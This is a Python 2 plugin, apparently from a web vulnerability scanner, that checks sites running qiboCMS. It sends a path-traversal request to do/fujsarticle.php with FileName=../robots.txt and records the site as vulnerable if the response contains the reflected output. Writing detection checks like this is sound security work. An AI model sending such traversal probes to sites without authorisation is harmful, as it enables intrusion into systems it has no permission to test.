#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s%s" % (ob['scheme'],ob['domain'],ob['base_path'])
        url += "robots.txt"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('# robots.txt for qiboCMS')>=0:       
        	url2 = "%s://%s/" % (ob['scheme'],domain)
        	url2 += "do/fujsarticle.php?type=like&FileName=../robots.txt"
        	res2, content2 = requestUrl(http,url2,ob['task_id'],ob['domain_id'])
        	if res2['status'] == '200' and content2.find('document.write(')>=0:
		    request = getRequest(url)
		    response = getResponse(res)
            	    list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:qibo_getwebshellScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
	write_scan_log(ob['task_id'],ob['domain_id'],"File:qibo_getwebshellScript.py, run_domain function :" + str(e))	
    #end try
    
    return list
#end def